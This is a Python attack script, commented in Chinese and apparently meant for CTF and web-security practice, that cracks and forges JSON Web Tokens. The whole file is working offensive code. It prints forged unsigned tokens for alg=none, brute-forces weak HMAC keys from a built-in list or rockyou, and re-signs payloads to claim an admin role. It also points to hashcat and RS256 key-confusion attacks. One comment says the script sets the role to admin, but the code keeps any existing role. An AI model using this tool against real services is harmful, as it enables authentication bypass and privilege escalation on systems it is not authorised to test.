# -*- coding: utf-8 -*-
# 脚本名称: JWT 解码与弱密钥爆破（HS256/HS384/HS512，alg=none）
# 方向: Crypto / Web（Token 安全）
# 简介: 解码 JWT 三段内容并检查 alg=none、弱 HMAC 密钥（内置常见弱口令表，
#       也可挂载 rockyou）。拿到密钥后给出重新签名的方法。
# 用法:
#   python jwt_crack.py '<完整JWT>'
#   python jwt_crack.py -f token.txt -w rockyou.txt
#   python jwt_crack.py --selftest
# 依赖: 仅标准库（HMAC 签名用 hashlib/hmac，无需 PyJWT）
# 参考: https://portswigger.net/web-security/jwt
import argparse
import base64
import hashlib
import hmac
import json

WEAK = ["secret", "password", "123456", "admin", "key", "jwt", "jwtsecret",
        "test", "root", "qwerty", "111111", "12345678", "abc123", "letmein",
        "welcome", "monkey", "dragon", "iloveyou", "changeme", "passw0rd",
        "your-256-bit-secret", "supersecret", "secretkey", "flag", "ctf"]

ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def b64u_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64u_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode(token):
    h, p, sig = token.strip().split(".")
    return json.loads(b64u_decode(h)), json.loads(b64u_decode(p)), sig, h, p


def sign(header, payload, key, alg):
    seg = b64u_encode(json.dumps(header, separators=(",", ":"), ensure_ascii=False).encode()) \
        + "." + b64u_encode(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode())
    sig = hmac.new(key.encode(), seg.encode(), ALGS[alg]).digest()
    return seg + "." + b64u_encode(sig)


def crack(token, wordlist=None):
    header, payload, sig, h, p = decode(token)
    alg = header.get("alg", "")
    print("[*] Header :", json.dumps(header, ensure_ascii=False))
    print("[*] Payload:", json.dumps(payload, ensure_ascii=False))
    if alg.lower() == "none":
        print("[!] alg=none！可直接删除签名段或留空伪造:")
        print("   ", f"{h}.{p}.")
        return
    if alg not in ALGS:
        print(f"[-] {alg} 为非对称算法，本脚本仅爆破 HMAC；RS256 可考虑公钥误用/混淆攻击")
        return
    words = WEAK
    if wordlist:
        words = [w.strip() for w in open(wordlist, encoding="utf-8", errors="replace") if w.strip()]
    signing_input = (h + "." + p).encode()
    rawsig = b64u_decode(sig)
    for w in words:
        if hmac.new(w.encode(), signing_input, ALGS[alg]).digest() == rawsig:
            print(f"[+] 弱密钥命中: {w!r}")
            print("[*] 用该密钥重新签名示例（把 payload 改成管理员）:")
            payload["role"] = payload.get("role", "admin")
            print("   ", sign(header, payload, w, alg))
            return w
    print("[-] 字典未命中，可: hashcat -m 16500 jwt.txt rockyou.txt")
    return None


def selftest():
    tok = sign({"alg": "HS256", "typ": "JWT"},
               {"user": "guest", "flag": "flag{jwt_weak_key}"}, "secret", "HS256")
    r = crack(tok)
    assert r == "secret"
    print("[+] selftest OK")


def main():
    ap = argparse.ArgumentParser(description="JWT 解码/弱密钥爆破")
    ap.add_argument("token", nargs="?")
    ap.add_argument("-f", "--file")
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        selftest(); return
    token = a.token
    if a.file:
        token = open(a.file).read().strip()
    if not token:
        token = input("粘贴 JWT: ").strip()
    crack(token, a.wordlist)


if __name__ == "__main__":
    main()
